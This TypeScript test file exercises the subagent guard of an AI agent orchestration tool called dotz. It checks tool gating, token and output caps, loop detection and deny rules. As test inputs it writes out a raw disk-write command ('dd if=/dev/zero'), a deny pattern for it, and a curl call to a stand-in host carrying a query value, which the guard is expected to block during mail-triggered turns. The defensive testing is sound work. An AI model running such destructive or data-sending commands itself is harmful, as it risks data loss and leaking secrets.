import { afterEach, beforeEach, expect, test } from "bun:test";
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { GUARD_DEFAULTS, isSubagent } from "./guard-config.ts";
import { MAIL_TURN_MARK } from "../hub/systemdeny.ts";
import { installSubagentGuard } from "./guard.ts";

const SCRIPT = `
const bind = agent => {
	const b = { agent, handlers: {}, tools: [], modes: {}, active: ["read", "bash", "task"], commands: [], logs: [], providers: [], sent: [], steers: [], activeCalls: 0, names: [], labels: [] };
	b.pi = {
		pi: { getAgentDir: () => process.env.TEST_AGENT_DIR },
		logger: { warn: m => b.logs.push(m) },
		on: (name, fn) => (b.handlers[name] ??= []).push(fn),
		registerTool: t => (b.tools.push(t.name), (b.modes[t.name] = t.loadMode ?? null), t.defaultInactive || b.active.push(t.name)),
		registerCommand: name => b.commands.push(name),
		registerProvider: id => b.providers.push(id),
		sendMessage: m => b.sent.push(String(m.content)),
		sendUserMessage: m => b.steers.push(String(m)),
		getThinkingLevel: () => "high",
		setThinkingLevel: () => {},
		getActiveTools: () => [...b.active],
		setActiveTools: async names => (b.activeCalls++, (b.active = [...names])),
		setSessionName: name => b.names.push(name),
		setLabel: label => b.labels.push(label),
	};
	return b;
};
const fire = async (b, name, event) => {
	const ctx = { agent: b.agent, cwd: process.env.TEST_CWD, sessionManager: { getSessionId: () => b.agent.id } };
	let result;
	for (const hook of b.handlers[name] ?? []) {
		const next = await hook(event, ctx);
		if (next?.block) return next;
		if (next !== undefined) result = next;
	}
	return result;
};
const reason = r => r?.reason ?? null;
const probe = async b => {
	const call = command => fire(b, "tool_call", { toolName: "bash", input: { command } });
	const push = reason(await call("bun publish"));
	const rule = reason(await call("dd if=/dev/zero of=/tmp/x"));
	const output = (await fire(b, "tool_result", { toolName: "bash", input: { command: "ls" }, content: [{ type: "text", text: "y".repeat(100000) }] }))?.content[0].text.length ?? null;
	const cache = (await fire(b, "before_provider_request", { payload: { system: [{ type: "text", text: "x", cache_control: { type: "ephemeral", ttl: "1h" } }] } })) ? "short" : "long";
	await fire(b, "session_compact", {});
	await fire(b, "session_compact", {});
	await fire(b, "turn_end", { message: { role: "assistant", usage: { input: 100, cacheRead: 2000000, cacheWrite: 0, output: 0 } }, toolResults: [{}] });
	const cap = reason(await call("ls"));
	return { push, rule, output, cache, cap, steers: b.steers.length };
};
const gates = async b => {
	const fs = await import("node:fs");
	const data = process.env.DOTZ_DIR, cfg = data + "/config.json", pending = data + "/restart-pending.json", bound = data + "/effort-bound.json";
	const meta = { toolCallId: b.agent.id, input: { command: "ls" } };
	fs.writeFileSync(cfg, JSON.stringify({ orchestrator: { rotate_tokens: 500000 } }));
	await fire(b, "tool_call", { toolName: "bash", ...meta });
	fs.writeFileSync(cfg, JSON.stringify({ orchestrator: { rotate_tokens: 700000 } }));
	await fire(b, "tool_result", { toolName: "bash", ...meta, content: [{ type: "text", text: "ok" }] });
	const owner = JSON.parse(fs.readFileSync(cfg, "utf8")).orchestrator.rotate_tokens;
	fs.writeFileSync(pending, JSON.stringify({ pid: process.pid }));
	const hold = (reason(await fire(b, "tool_call", { toolName: "task", input: {} })) ?? "").includes("재시작 대기");
	fs.rmSync(pending);
	await fire(b, "tool_result", { toolName: "task", input: {}, content: [{ type: "text", text: "started st_abc123def" }] });
	const effort = fs.existsSync(bound);
	fs.rmSync(bound, { force: true });
	return { owner, hold, effort };
};
const checks = async b => {
	const call = (toolName, input, toolCallId) => fire(b, "tool_call", { toolName, input, toolCallId });
	const loop = [];
	for (let i = 0; i < 9; i++) loop.push(reason(await call("read", { path: "same.txt" }, "c" + i)));
	const broad = reason(await call("grep", { path: "/" }));
	const quick = reason(await call("dotz_lane", { action: "launch" }));
	const limit = reason(await call("task", { tasks: [{ task: "Stop when the usage limit drops below 5%." }] }));
	await fire(b, "session_compact", {});
	await fire(b, "session_compact", {});
	const compacted = reason(await call("bash", { command: "ls" }));
	return { broad, quick, limit, loop, compacted, steers: b.steers.length };
};
const view = b => ({ tools: b.tools, modes: b.modes, active: b.active, activeCalls: b.activeCalls, commands: b.commands, logs: b.logs, providers: b.providers, hooks: Object.fromEntries(Object.entries(b.handlers).map(([k, v]) => [k, v.length])) });
if (process.env.TEST_NO_EXTENSIONS) process.argv.push("--no-extensions");
const dotz = (await import(process.env.TEST_INDEX)).default;
const main = bind({ kind: "main", id: "Main", name: "main", depth: 0 });
const sub = bind({ kind: "sub", id: "Prober", name: "task", depth: 1, parentId: "Main" });
const early = bind(sub.agent);
for (const b of [main, sub, early]) dotz(b.pi);
const again = bind({ kind: "main", id: "Main2", name: "main", depth: 0 });
dotz(again.pi);
const isolated = bind({ kind: "sub", id: "Isolated", name: "task", depth: 1, parentId: "Main" });
const fresh = (await import(process.env.TEST_INDEX.replace(/index\.ts$/, "omp-host.ts?mtime=1"))).ompHosts(isolated.pi);
for (const name of ["dotz_send", "dotz_recall"]) fresh.main.registerTool({ name });
const atFactory = { main: [...main.active], sub: [...sub.active], isolated: [...isolated.active] };
for (const b of [main, sub, again]) await fire(b, "session_start", {});
const gateway = main.tools.filter(n => n !== "dotz_recall");
const refused = async b => (await Promise.all(gateway.map(async n => [n, await fire(b, "tool_call", { toolName: n, input: {} })]))).filter(([, r]) => r?.block).map(([n]) => n);
const mail = async () => {
	const cmd = { toolName: "bash", input: { command: "curl -s 'https://x.example/c?k=value'" } };
	const before = Boolean((await fire(sub, "tool_call", cmd))?.block);
	await fire(main, "input", { text: process.env.TEST_MARK + "\\nsummary of a mail", source: "rpc" });
	const during = Boolean((await fire(sub, "tool_call", cmd))?.block);
	await fire(main, "agent_end", {});
	return { before, during, after: Boolean((await fire(sub, "tool_call", cmd))?.block) };
};
const result = { main: view(main), sub: view(sub), again: view(again), atFactory, gateway, refusedForMain: await refused(main), refusedBeforeStart: await refused(early), connectors: process.env.ENABLE_CLAUDEAI_MCP_SERVERS ?? null, names: { main: main.names, sub: sub.names }, labels: { main: main.labels, sub: sub.labels } };
if (process.env.TEST_PROBE) Object.assign(result, { mainProbe: await probe(main), subProbe: await probe(sub) });
if (process.env.TEST_GATES) Object.assign(result, { mainGates: await gates(main), subGates: await gates(sub) });
if (process.env.TEST_CHECKS) Object.assign(result, { mainChecks: await checks(main), subChecks: await checks(sub) });
if (process.env.TEST_MAIL) Object.assign(result, { mail: await mail() });
console.log(JSON.stringify(result));
process.exit(0);`;

type View = { tools: string[]; modes: Record<string, string | null>; active: string[]; activeCalls: number; commands: string[]; logs: string[]; providers: string[]; hooks: Record<string, number> };
type Probe = { push: string | null; rule: string | null; output: number | null; cache: string; cap: string | null; steers: number };
type Checks = { broad: string | null; quick: string | null; limit: string | null; loop: (string | null)[]; compacted: string | null; steers: number };
type Report = { main: View; sub: View; again: View; atFactory: { main: string[]; sub: string[]; isolated: string[] }; gateway: string[]; refusedForMain: string[]; refusedBeforeStart: string[]; connectors: string | null; names: { main: string[]; sub: string[] }; labels: { main: string[]; sub: string[] }; mail?: { before: boolean; during: boolean; after: boolean }; mainProbe?: Probe; subProbe?: Probe; mainGates?: Gates; subGates?: Gates; mainChecks?: Checks; subChecks?: Checks };
type Gates = { owner: number; hold: boolean; effort: boolean };

let root: string;
beforeEach(() => {
	root = mkdtempSync(join(tmpdir(), "dotz-omp-host-"));
	for (const dir of ["data/secrets", "agent/extensions", "state", "cwd"]) mkdirSync(join(root, dir), { recursive: true });
	writeFileSync(join(root, "data", "config.json"), JSON.stringify({ guard: { task_token_cap: 1_000_000, task_cap_grow: false, task_compact_tokens: 0 } }));
	writeFileSync(join(root, "data", "RULES.md"), "## Blocked commands\n- deny: ^dd if= | raw disk writes stay with the owner\n");
});
afterEach(() => rmSync(root, { recursive: true, force: true }));

function host(env: Record<string, string>): Report {
	const base = { PATH: dirname(process.execPath), HOME: root, DOTZ_DIR: join(root, "data"), ORCH_GUARD_STATE_DIR: join(root, "state"), TEST_INDEX: join(import.meta.dir, "index.ts"), TEST_AGENT_DIR: join(root, "agent"), TEST_CWD: join(root, "cwd") };
	const r = Bun.spawnSync([process.execPath, "-e", SCRIPT], { cwd: join(root, "cwd"), env: { ...base, ...env }, stdout: "pipe", stderr: "pipe" });
	expect(r.exitCode, r.stderr.toString()).toBe(0);
	return JSON.parse(r.stdout.toString().trim().split("\n").pop() ?? "{}");
}

const omp = { DOTZ_RUNTIME: "omp", TEST_NO_EXTENSIONS: "1", TEST_PROBE: "1" };
const workerGuards = (p: Probe) => [p.push !== null, p.output !== null && p.output < 100_000, p.cache === "short", p.cap !== null];

test("isSubagent: ctx.agent decides on omp, OMO_SENPI_TASK_DEPTH on OmO", () => {
	expect(isSubagent({ agent: { kind: "sub" } }, {})).toBe(true);
	expect(isSubagent({ agent: { kind: "main" } }, { OMO_SENPI_TASK_DEPTH: "1" })).toBe(false);
	expect(isSubagent(undefined, { OMO_SENPI_TASK_DEPTH: "1" })).toBe(true);
	expect(isSubagent(undefined, {})).toBe(false);
	expect(isSubagent({}, {})).toBe(false);
});

test("omp orchestrator: the main agent (the first factory run) has the gateway tools active at once; a task subagent's run registers them inactive and ends up with the worker set and dotz_recall only; a main agent that is not the first run switches them on when its session starts", () => {
	const r = host({ ...omp, DOTZ_ORCHESTRATOR: "1" });
	expect(r.atFactory.main).toEqual(expect.arrayContaining(["dotz_send", "dotz_conv", "dotz_lane", "dotz_merge", "dotz_connect", "dotz_auth", "dotz_recall", "harness_doctor"]));
	expect(r.atFactory.sub).toEqual(["read", "bash", "task", "dotz_recall"]);
	expect(r.atFactory.isolated).toEqual(["read", "bash", "task", "dotz_recall"]);
	expect(r.sub.active).toEqual(["read", "bash", "task", "dotz_recall"]);
	expect(r.sub.tools).toEqual(expect.arrayContaining(r.gateway));
	expect([r.main.activeCalls, r.sub.activeCalls]).toEqual([0, 0]);
	expect(r.again.activeCalls).toBe(1);
	expect(r.again.active).toEqual(expect.arrayContaining([...r.gateway, "dotz_recall"]));
	expect(r.gateway).toEqual(expect.arrayContaining(["dotz_send", "dotz_lane", "dotz_merge", "harness_doctor"]));
	expect(r.refusedForMain).toEqual([]);
	expect(r.refusedBeforeStart).toEqual(r.gateway);
	expect(workerGuards(r.subProbe!)).toEqual([true, true, true, true]);
	expect(workerGuards(r.mainProbe!)).toEqual([false, false, false, false]);
	expect(r.subProbe!.cap).toContain("token cap");
	expect(r.subProbe!.steers).toBe(0);
});

const topLevel = (v: View) => Object.entries(v.modes).filter(([, mode]) => mode === "essential").map(([name]) => name).sort();

test("omp orchestrator: the dotz_ gateway tools are top-level tools, not xd:// devices; dotz_recall and the harness tools stay devices, and a main agent that is not the first run gets the same placement", () => {
	const r = host({ ...omp, TEST_PROBE: "", DOTZ_ORCHESTRATOR: "1" });
	const gateway = r.gateway.filter(name => name.startsWith("dotz_")).sort();
	expect(gateway).toEqual(expect.arrayContaining(["dotz_send", "dotz_conv", "dotz_peer", "dotz_lane", "dotz_channel", "dotz_watch", "dotz_schedule", "dotz_ledger", "dotz_merge", "dotz_verify", "dotz_connect", "dotz_auth", "dotz_escalate"]));
	expect(topLevel(r.main)).toEqual(gateway);
	expect(topLevel(r.again)).toEqual(gateway);
	expect([r.main.modes.dotz_recall, r.main.modes.harness_doctor, r.main.modes.harness_token_audit]).toEqual([null, null, null]);
});

test("omp lane: the lane's dotz_ tools are top-level tools too; dotz_recall stays a device", () => {
	const r = host({ ...omp, TEST_PROBE: "", DOTZ_LANE: "alpha" });
	expect(topLevel(r.main)).toEqual(["dotz_auth", "dotz_escalate", "dotz_main", "dotz_merge", "dotz_verify"]);
	expect(r.main.modes.dotz_recall).toBeNull();
});

test("tools stay devices (no load mode) in the owner's own terminal and on OmO, which has no xd:// devices", () => {
	expect(topLevel(host({ TEST_PROBE: "" }).main)).toEqual([]);
	expect(topLevel(host({ DOTZ_ORCHESTRATOR: "1", DOTZ_RUNTIME: "omo" }).main)).toEqual([]);
});

test("omp orchestrator: owner values and the effort bound run for the main agent only; the restart hold binds a subagent that spawns too", () => {
	const r = host({ ...omp, TEST_PROBE: "", TEST_GATES: "1", DOTZ_ORCHESTRATOR: "1" });
	expect(r.mainGates).toEqual({ owner: 500000, hold: true, effort: true });
	expect(r.subGates).toEqual({ owner: 700000, hold: true, effort: false });
});

test("omp lane: the owner values run for the lane only and the restart hold for the lane and its subagents; a lane has no effort bound", () => {
	const r = host({ ...omp, TEST_PROBE: "", TEST_GATES: "1", DOTZ_LANE: "alpha" });
	expect(r.mainGates).toEqual({ owner: 500000, hold: true, effort: false });
	expect(r.subGates).toEqual({ owner: 700000, hold: true, effort: false });
});

test("a subagent of a mail-woken omp turn is bound by the mail turn, and is free again when the turn ends", () => {
	for (const role of [{ DOTZ_ORCHESTRATOR: "1" }, { DOTZ_LANE: "alpha" }]) {
		const r = host({ ...omp, ...role, TEST_PROBE: "", TEST_MAIL: "1", TEST_MARK: MAIL_TURN_MARK });
		expect(r.mail).toEqual({ before: false, during: true, after: false });
	}
});

test("the claude.ai connectors switch is set by orchestrator and lane sessions only, and an owner-set value wins", () => {
	expect(host({ ...omp, DOTZ_ORCHESTRATOR: "1" }).connectors).toBe("false");
	expect(host({ ...omp, DOTZ_LANE: "alpha" }).connectors).toBe("false");
	expect(host({ DOTZ_ORCHESTRATOR: "1", DOTZ_RUNTIME: "omo" }).connectors).toBe("false");
	expect(host({ ...omp, DOTZ_ORCHESTRATOR: "1", ENABLE_CLAUDEAI_MCP_SERVERS: "true" }).connectors).toBe("true");
	expect(host({}).connectors).toBeNull();
});

test("omp orchestrator and conversation sessions are named through setSessionName, not the extension label; lanes and subagents set neither", () => {
	const orchestrator = host({ ...omp, DOTZ_ORCHESTRATOR: "1" });
	expect([orchestrator.names.main, orchestrator.names.sub, orchestrator.labels.main, orchestrator.labels.sub]).toEqual([["Dotz mode"], [], [], []]);
	const lane = host({ ...omp, DOTZ_LANE: "alpha" });
	expect([lane.names.main, lane.labels.main]).toEqual([[], []]);
});

test("the owner's own terminal: dotz_mode and the harness tools belong to the main agent, a subagent holds none of them and a call to one is refused", () => {
	const r = host({});
	expect(r.gateway).toEqual(expect.arrayContaining(["dotz_mode", "harness_doctor", "harness_token_audit"]));
	expect(r.atFactory.main).toEqual(expect.arrayContaining(r.gateway));
	expect(r.atFactory.sub).toEqual(["read", "bash", "task"]);
	expect(r.atFactory.isolated).toEqual(["read", "bash", "task", "dotz_recall"]);
	expect(r.refusedForMain).toEqual([]);
	expect(r.refusedBeforeStart).toEqual(r.gateway);
	expect(r.again.active).toEqual(expect.arrayContaining(r.gateway));
});

test("omp lane: its subagent loses dotz_main and the rest of the lane's tools; the lane keeps them, its output cap and its 5-minute cache, and no token cap", () => {
	const r = host({ ...omp, DOTZ_LANE: "alpha" });
	expect(r.main.active).toEqual(expect.arrayContaining(["dotz_main", "dotz_merge", "dotz_auth", "dotz_verify", "dotz_escalate", "dotz_recall"]));
	expect(r.sub.active).toEqual(["read", "bash", "task", "dotz_recall"]);
	expect(r.atFactory.sub).toEqual(["read", "bash", "task", "dotz_recall"]);
	expect(r.atFactory.isolated).toEqual(["read", "bash", "task", "dotz_recall"]);
	expect(r.refusedForMain).toEqual([]);
	expect(r.refusedBeforeStart).toEqual(r.gateway);
	expect(workerGuards(r.subProbe!)).toEqual([true, true, true, true]);
	expect(workerGuards(r.mainProbe!)).toEqual([false, true, true, false]);
});

test("the owner's rules bind the main agent and its subagents alike", () => {
	const r = host({ ...omp, DOTZ_ORCHESTRATOR: "1" });
	expect(r.mainProbe!.rule).toContain("raw disk writes");
	expect(r.subProbe!.rule).toContain("raw disk writes");
});

test("omp subagent: the repeat loop, broad search, quick chat and limit-stop checks bind it as they bind the main agent, and the compaction wrap-up stays with the task cap", () => {
	const r = host({ ...omp, TEST_PROBE: "", TEST_CHECKS: "1", DOTZ_LANE: "alpha", DOTZ_CONV: "quick" });
	const sub = r.subChecks!;
	expect(sub.broad).toContain("too broad");
	expect(sub.quick).toContain("quick chat");
	expect(sub.limit).toContain("usage limit");
	expect(sub.loop.slice(0, 7)).toEqual(Array(7).fill(null));
	expect(sub.loop[7]).toContain("repeat guard");
	expect(sub.compacted).toBeNull();
	expect(sub.steers).toBe(0);
	expect(r.mainChecks).toEqual(sub);
});

test("dotz's own guard runs in a dotz omp session (--no-extensions) although the owner's guard is installed, and defers when omp discovers extensions", () => {
	writeFileSync(join(root, "agent", "extensions", "orchestrator-guard.ts"), "export default () => {};\n");
	const spawned = host({ ...omp, TEST_PROBE: "", TEST_CHECKS: "1", DOTZ_ORCHESTRATOR: "1" });
	expect(spawned.main.commands).toContain("compact-switch");
	expect(spawned.sub.commands).toContain("compact-switch");
	expect(spawned.main.logs).toEqual([]);
	expect(spawned.subChecks!.broad).toContain("too broad");
	expect(spawned.subChecks!.loop[7]).toContain("repeat guard");

	const interactive = host({ DOTZ_ORCHESTRATOR: "1", DOTZ_RUNTIME: "omp", TEST_CHECKS: "1" });
	expect(interactive.main.commands).not.toContain("compact-switch");
	expect(interactive.main.logs.join("\n")).toContain("orchestrator-guard.ts");
	expect(interactive.subChecks).toMatchObject({ broad: null, limit: null, compacted: null, steers: 0, loop: Array(9).fill(null) });

	const terminal = host({});
	expect(terminal.main.commands).not.toContain("compact-switch");
	expect(terminal.main.logs.join("\n")).toContain("orchestrator-guard.ts");
});

test("a subagent registers the API-key provider from the secrets folder when the entry lets workers use the key; without that the key stays with the main agent", () => {
	const spec = JSON.stringify({ id: "anthropic-apikey", baseUrl: "https://api.anthropic.com", api: "anthropic-messages", models: [{ id: "claude-sonnet-5-5" }] });
	writeFileSync(join(root, "data", "secrets", "anthropic-api-key"), "sk-from-file\n");
	const key = { ...omp, TEST_PROBE: "", DOTZ_ORCHESTRATOR: "1", DOTZ_KEY_PROVIDER: spec, DOTZ_KEY_VALUE: "sk-test", DOTZ_KEY_FILE: "anthropic-api-key" };
	const shared = host({ ...key, DOTZ_KEY_WORKERS: "1" });
	expect([shared.main.providers, shared.sub.providers]).toEqual([["anthropic-apikey"], ["anthropic-apikey"]]);
	expect([shared.main.hooks.before_subagent_spawn, shared.sub.hooks.before_subagent_spawn]).toEqual([3, 3]);
	expect(shared.sub.hooks.turn_end).toBeGreaterThan(0);
	const held = host(key);
	expect([held.main.providers, held.sub.providers]).toEqual([["anthropic-apikey"], []]);
	expect([held.main.hooks.before_subagent_spawn, held.sub.hooks.before_subagent_spawn]).toEqual([4, 3]);
});

test("installSubagentGuard installs nothing while the guard is off", () => {
	const names: string[] = [];
	const pi = { on: (name: string) => void names.push(name) };
	installSubagentGuard(pi, { ...GUARD_DEFAULTS, enabled: false });
	expect(names).toEqual([]);
	installSubagentGuard(pi, { ...GUARD_DEFAULTS, defer_to_installed: false });
	expect(names).toEqual(["tool_result", "before_subagent_spawn", "tool_call"]);
});
